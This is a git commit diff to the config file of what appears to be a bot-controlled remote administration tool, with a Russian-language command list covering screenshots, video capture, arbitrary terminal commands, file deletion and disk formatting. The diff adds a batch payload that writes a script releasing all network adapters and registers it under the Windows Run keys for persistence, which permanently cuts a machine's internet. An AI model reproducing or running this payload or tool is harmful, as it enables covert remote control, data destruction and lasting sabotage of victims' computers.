f53f6b6bb5305dee0b7f36815b25c07f72093173
NullifiedVlad <59374393+NullifiedVlad@users.noreply.github.com>
2020-04-05 22:15:16 +0300

    Update config.py

--- config.py
+++ config.py
@@ -1,5 +1,14 @@
 token = '' #Вставьте токен бота
 channel =  #вставьте id канала
+
+disable_internet = '''
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f" '''
+
 helpmessage = '''
 -=**Configuration Administrarion Tool**=-
 **!move** (X) (Y) (time) - передвинуть курсор.
@@ -7,10 +16,14 @@ helpmessage = '''
 **!write** (message) - напечатать что-то.
 **!send** (how_many) - нажать клавишу несколько раз.
 **!screenshot** - сделать скриншот экрана.
+**!playsound** (1-2) - проиграть звук.
 **!changelanguage** - изменить раскладку клавиатуры.
 **!help** - выводит это сообщение.
 **!processlist** - выводит список процессов.
 **!command** - выполнить комманду в терминале.
 **!kill** (process) - закрыть принудительно процесс.
-**!video** -захват видео
--==== Made by NullifiedVlad ====-'''
+**!video** - захват видео.
+**!delete** (file) - удалить файл.
+**!format** (disk) - отформатировать диск.
+**!inet_kill**  - убить интернет соединение (навсегда).
+-==== **Made by NullifiedVlad** ====-'''
